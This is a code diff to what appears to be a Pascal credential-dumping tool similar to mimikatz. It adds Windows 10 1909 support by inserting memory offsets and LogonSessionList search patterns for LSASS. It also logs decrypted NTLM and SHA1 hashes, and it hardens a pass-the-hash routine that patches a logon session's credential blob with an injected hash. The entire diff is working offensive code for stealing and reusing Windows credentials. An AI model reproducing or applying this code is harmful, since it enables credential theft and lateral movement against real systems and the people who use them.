@@ -322,6 +322,7 @@ WIN_BUILD_10_1709:ShortInt=	-21;
 WIN_BUILD_10_1803:ShortInt=	-21; //verified
 WIN_BUILD_10_1809:ShortInt=	-24;
 WIN_BUILD_10_1903:ShortInt=	-24;
+WIN_BUILD_10_1909:ShortInt=	-24;
 WIN_BUILD_10_2004:ShortInt=	-24;
 //offset x86
 WIN_BUILD_XP_86:ShortInt=-8;
@@ -357,6 +358,7 @@ begin
      if (pos('-1803',winver)>0) then patch_pos :=WIN_BUILD_10_1803;
      if (pos('-1809',winver)>0) then patch_pos :=WIN_BUILD_10_1809;
      if (pos('-1903',winver)>0) then patch_pos :=WIN_BUILD_10_1903; //verified
+     if (pos('-1909',winver)>0) then patch_pos :=WIN_BUILD_10_1909; //verified
      if (pos('-2004',winver)>0) then patch_pos :=WIN_BUILD_10_2004; //verified
      end;
   if (lowercase(osarch)='x86') then
@@ -497,6 +499,12 @@ begin
         patch_pos:=23;
         end;
      if (pos('-1903',winver)>0)  then //win10
+        begin
+        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
+        patch_pos:=23;
+        end;
+     if (pos('-1909',winver)>0)  then //win10
         begin
         setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
@@ -722,12 +730,13 @@ begin
                                              (pos('-2004',winver)>0)
                                              then
                                              begin
-                                             //log('1903');
+                                             log('after windows10 post 1703 (incl.)');
                                              log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash) ,1);
                                              log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).sha1) ,1);
                                              end
                                              else
                                              begin
+                                              log('before windows10 1703 (excl.)');
                                              log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
                                              log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
                                              end;
@@ -867,7 +876,11 @@ begin
     begin
     //cycle thru logonsessions to match the luid
     //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
-    findlsakeys (lsass_pid,deskey,aeskey,iv );
+    if findlsakeys (lsass_pid,deskey,aeskey,iv )=false then
+       begin
+       log('findlsakeys failed',1);
+       exit;
+       end;
     logonpasswords (lsass_pid ,stats.AuthenticationId,hash); //put your hash here
     //and finally resume...
     ResumeThread(pi.hThread );
